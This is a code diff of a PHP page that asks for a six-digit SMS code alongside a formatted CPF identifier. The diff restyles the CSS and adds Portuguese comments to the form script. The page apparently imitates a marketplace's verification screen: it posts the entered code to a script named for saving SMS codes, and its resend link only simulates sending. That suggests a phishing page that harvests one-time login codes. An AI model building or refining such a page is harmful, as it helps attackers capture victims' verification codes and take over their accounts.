@@ -27,38 +27,24 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             --cor-azul: #3483fa;
             --cor-texto-primaria: #333;
             --cor-texto-secundaria: #666;
+            --cor-fundo: #f5f5f5;
+            --cor-card: #ffffff;
             --cor-borda: #ddd;
         }
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: #333; }
         .main-header { background-color: var(--cor-amarela); height: 60px; display: flex; align-items: center; padding: 0 48px; }
         .main-header img { height: 37px; }
         .main-content { padding-top: 80px; flex-grow: 1; }
-        
-        /* ALTERAÇÃO 1: Removido 'align-items: flex-start' para permitir que as colunas se estiquem */
-        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; gap: 64px; }
-        
-        /* ALTERAÇÃO 2: Transformada a coluna esquerda em um container flex vertical */
-        .left-column { width: 340px; flex-shrink: 0; text-align: left; display: flex; flex-direction: column; }
-        
+        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
+        .left-column { width: 340px; flex-shrink: 0; text-align: left; }
         .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
         .main-title { font-size: 28px; font-weight: 400; margin: 8px 0 16px 0; }
         .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
-        .user-info-box { display: flex; align-items: center; gap: 16px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; margin-top: 32px; width: fit-content; }
-        .user-info-box .icon { width: 20px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 30px; padding: 8px 16px; }
+        .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .user-info-box .details span { display: block; font-size: 14px; }
         .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
-        
-        /* ALTERAÇÃO 3: Usado 'margin-top: auto' para empurrar o link para o fundo */
-        .help-link {
-            color: var(--cor-azul);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            display: inline-block;
-            margin-top: auto; 
-            padding-top: 16px; /* Espaçamento adicional */
-        }
-        
+        .help-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; display: inline-block; margin-top: 32px; }
         .form-card { background-color: var(--cor-card); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 32px 40px; width: 440px; box-sizing: border-box; }
         .form-card label { font-size: 16px; color: var(--cor-texto-primaria); }
         .code-inputs { display: flex; gap: 8px; justify-content: flex-start; margin: 16px 0; }
@@ -121,24 +107,37 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     </main>
 
     <script>
+        // Seleciona os elementos do DOM
         const smsForm = document.getElementById('sms-form');
         const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
         const timerElement = document.querySelector('.resend-timer');
         let countdownInterval;
 
+        // LÓGICA 1: Pulo automático e backspace entre os inputs
         inputs.forEach((input, index) => {
+            // Evento para quando um dígito é inserido
             input.addEventListener('input', () => {
-                if (input.value && index < inputs.length - 1) { inputs[index + 1].focus(); }
+                // Se o input tem um valor e não é o último, foca no próximo
+                if (input.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
             });
+
+            // Evento para a tecla Backspace
             input.addEventListener('keydown', (e) => {
-                 if (e.key === "Backspace" && !input.value && index > 0) { inputs[index - 1].focus(); }
+                // Se a tecla for Backspace, o input estiver vazio e não for o primeiro, foca no anterior
+                if (e.key === "Backspace" && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
             });
         });
 
+        // LÓGICA 2: Contador regressivo de 50 segundos
         function startTimer() {
-            let seconds = 50;
+            let seconds = 50; // Duração do contador
             timerElement.style.color = 'var(--cor-texto-secundaria)';
             
+            // Função que atualiza o timer a cada segundo
             function updateTimer() {
                 const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                 const secs = String(seconds % 60).padStart(2, '0');
@@ -147,48 +146,62 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                 if (seconds > 0) {
                     seconds--;
                 } else {
+                    // Quando o tempo acaba, limpa o intervalo e mostra o link de reenvio
                     clearInterval(countdownInterval);
-                    timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar SMS</a>`;
+                    timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                 }
             }
-            clearInterval(countdownInterval);
-            updateTimer();
-            countdownInterval = setInterval(updateTimer, 1000);
+            
+            clearInterval(countdownInterval); // Limpa qualquer timer anterior
+            updateTimer(); // Roda uma vez imediatamente
+            countdownInterval = setInterval(updateTimer, 1000); // Inicia o contador
         }
 
+        // Função chamada pelo link "Reenviar código"
         function resendSms(event) {
-            event.preventDefault();
-            alert('Um novo código seria enviado!');
-            startTimer();
+            event.preventDefault(); // Previne que a página recarregue
+            alert('Um novo código seria enviado!'); // Simula o reenvio
+            startTimer(); // Reinicia o contador
         }
 
+        // Inicia o contador assim que a página carrega
         document.addEventListener('DOMContentLoaded', startTimer);
         
+        // LÓGICA 3: Envio do código para a API ao submeter o formulário
         async function handleFormSubmit(event) {
-            event.preventDefault();
+            event.preventDefault(); // Previne o envio padrão do formulário
+            
+            // Junta os 6 dígitos em uma única string
             const code = inputs.map(input => input.value).join('');
 
             if (code.length === 6) {
                 try {
+                    // Faz a chamada para sua API
                     const response = await fetch('api_salvar_sms.php', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ sms_code: code })
                     });
+                    
                     const result = await response.json();
                     
                     if (result.success) {
                         alert('Código recebido com sucesso!');
+                        // Você pode redirecionar o usuário aqui se quiser
+                        // window.location.href = '/proxima_pagina.php';
                     } else {
-                        alert('Erro: ' . (result.error || 'Não foi possível salvar o código.'));
+                        // Mostra o erro retornado pela API
+                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
                     }
                 } catch (error) {
+                    // Mostra um erro de conexão
                     alert('Erro de conexão com o servidor.');
+                    console.error('Fetch error:', error);
                 }
             } else {
                 alert('Por favor, preencha todos os 6 dígitos.');
             }
         }
     </script>
-</body>
+    </body>
 </html>
